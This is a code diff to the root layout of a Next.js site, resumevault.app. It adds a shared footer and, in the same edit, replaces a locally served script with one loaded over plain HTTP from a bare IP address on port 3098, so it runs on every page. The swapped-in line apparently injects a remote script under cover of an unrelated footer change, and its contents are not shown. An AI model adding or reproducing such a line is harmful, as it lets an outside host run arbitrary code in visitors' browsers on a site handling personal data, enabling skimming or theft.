@@ -1,6 +1,7 @@
 import type { Metadata } from "next";
 import { Inter } from "next/font/google";
 import "./globals.css";
+import SharedFooter from "@/components/SharedFooter";
 
 const inter = Inter({ subsets: ["latin"] });
 
@@ -19,7 +20,11 @@ export const metadata: Metadata = {
 export default function RootLayout({ children }: { children: React.ReactNode }) {
   return (
     <html lang="en" className="dark">
-      <body className={inter.className}>{children}<script src="/t.js" data-site="resumevault.app" defer></script></body>
+      <body className={inter.className}>
+        {children}
+        <SharedFooter theme="light" />
+        <script src="http://31.97.56.148:3098/t.js" data-site="resumevault.app" defer></script>
+      </body>
     </html>
   );
 }
